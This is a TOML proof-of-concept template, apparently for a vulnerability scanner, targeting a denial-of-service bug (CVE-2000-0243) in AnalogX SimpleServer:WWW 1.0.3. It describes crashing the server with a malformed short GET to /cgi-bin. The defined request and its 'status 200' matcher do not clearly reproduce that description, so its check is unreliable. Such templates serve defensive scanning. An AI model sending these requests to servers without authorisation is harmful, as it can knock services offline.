[info]
author = "ave"
description = "向 AnalogX SimpleServer:WWW 1.0.3 的 /cgi-bin 路径发送特制的短 GET 请求（缺少 HTTP 版本号和 Host 头），可触发服务器处理异常导致服务崩溃。攻击无需身份认证，远程利用。"
id = "POC-AVE-2000-0221"
name = "AnalogX SimpleServer:WWW 短 GET 请求拒绝服务 PoC"
severity = "medium"
tags = ["ave-2000-0221"]
vuln_id = [
    "CVE-2000-0243",
    "AVE-2000-0221",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
